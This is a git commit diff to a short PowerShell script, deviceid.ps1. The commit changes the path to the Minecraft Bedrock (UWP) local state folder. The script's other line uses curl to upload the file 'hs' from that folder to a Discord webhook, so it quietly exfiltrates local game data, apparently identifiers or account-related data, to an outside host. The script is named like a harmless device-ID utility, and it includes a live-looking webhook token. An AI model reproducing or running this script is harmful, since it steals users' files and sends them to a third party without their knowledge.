1e32e89c4ba0b2d3b15c17525c8f2b2efcdb8610
UxuTaz <128841831+UxuTaz@users.noreply.github.com>
2023-04-13 22:54:43 +0200

    Update deviceid.ps1

--- deviceid.ps1
+++ deviceid.ps1
@@ -1,2 +1,2 @@
-cd %localappdata%\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe
+cd AppData\Local\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe
 curl -H "Content-Type: multipart/form-data" -F "file=@hs" "https://discord.com/api/webhooks/1082023903175643178/xa_W-2Uin_fXYV5iKe6ipGGTqqENZY5ZJGEwHiW7MDSHXf9AjMG5pRQiHTAleFAPsEL5"
